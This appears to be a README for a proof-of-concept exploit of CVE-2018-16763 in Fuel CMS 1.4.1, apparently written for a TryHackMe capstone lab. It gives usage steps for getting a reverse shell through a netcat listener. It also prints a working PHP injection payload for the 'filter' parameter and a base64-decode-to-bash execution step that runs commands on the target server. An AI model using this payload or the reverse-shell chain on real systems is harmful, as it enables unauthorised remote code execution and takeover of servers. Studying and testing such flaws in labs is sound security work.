# 🔧 Fuel CMS 1.4.1 RCE Exploit (CVE-2018-16763)

This is a Python proof-of-concept exploit for **CVE-2018-16763**, a remote code execution vulnerability in **Fuel CMS ≤ 1.4.1**. The vulnerability exists because unsanitized input to the `filter` parameter in `/fuel/pages/select/` is evaluated as raw PHP via `create_function()`, allowing unauthenticated attackers to execute arbitrary system commands on the server.

> ⚠️ This exploit was created as part of a TryHackMe vulnerability capstone. All testing was performed in a controlled lab environment. Code was implemented by me, with AI-assisted guidance used for clarity and structure.

## 🚀 Usage

Start a listener on your machine:

```bash
nc -lvnp 4444
```

Run the script:

```bash
python3 fuelcms_rce_cve-2018-16763.py
```

Provide the following inputs when prompted:
- Target URL (e.g., `http://10.10.67.9`)
- Your IP for reverse shell (LHOST)
- Port to listen on (LPORT)

If the exploit succeeds and outbound connections are allowed, you’ll get a reverse shell as the web server user (typically `www-data`).

## 🧠 How It Works

Fuel CMS 1.4.1 improperly evaluates the `filter` parameter using `create_function()`. This allows attackers to inject PHP expressions such as:

```php
'+pi(print($a='system'))+$a('id')+'
```

This payload:
1. Assigns the `system()` function to `$a`
2. Executes `$a('id')`, effectively running `system('id')`

This script replaces `'id'` with a **Base64-encoded bash reverse shell** to avoid special character issues. The payload is decoded and executed using:

```bash
echo <base64> | base64 -d | bash
```
